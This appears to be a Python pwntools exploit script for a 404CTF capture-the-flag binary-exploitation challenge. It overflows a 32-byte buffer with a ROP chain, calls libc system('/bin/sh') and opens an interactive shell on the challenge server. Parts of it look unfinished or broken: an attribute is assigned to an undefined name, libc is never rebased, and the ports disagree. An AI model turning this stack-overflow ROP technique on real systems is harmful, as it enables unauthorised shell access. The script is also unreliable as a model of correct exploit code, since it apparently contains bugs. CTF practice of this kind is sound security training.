#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges.404ctf.fr --port 31832 la_feuille_blanche
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "la_feuille_blanche")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "challenges.404ctf.fr"
port = int(args.PORT or 31822)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
init-gef
tbreak *0x{exe.entry:x}
b *0x08048450
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
rop = ROP(exe)
libc = exe.libc
vuln_addr = 0x08048452  # trouv√©e dans ghidra, addresse du main 
binsh = 0xf7dbcd88
rop.call(exe.symbols["read"], [exe.got["read"]])
rop.call(vuln_addr)
offset = 32
pattern = cyclic(offset)
payload = pattern + rop.chain()
read.addr = hex(exe.symbols["read"])
#print(hexdump(payload))
io.sendline(payload)
# io.sendline(pattern + p32(vuln_addr))
log.info(f"symbols inclus dans {exe}")
pprint(exe.symbols)
lib_rop = ROP(libc)
#lib_rop.read = lib_rop.symbols["read"]
#   print(f"read.addr = {read.addr}\nlib_rop.addr = {lib_rop.read}")
#   lib_rop.addr = read.addr - lib_rop.symbols["read"] 
lib_rop.call(libc.symbols["puts"], [next(libc.search(b"/bin/sh\x00"))])
lib_rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
lib_rop.call(libc.symbols["exit"])
# pprint(lib_rop.chain())
io.sendline(pattern + lib_rop.chain())
# log.info(f"symbols inclus dans {libc}")
# pprint(libc.symbols)
io.interactive()
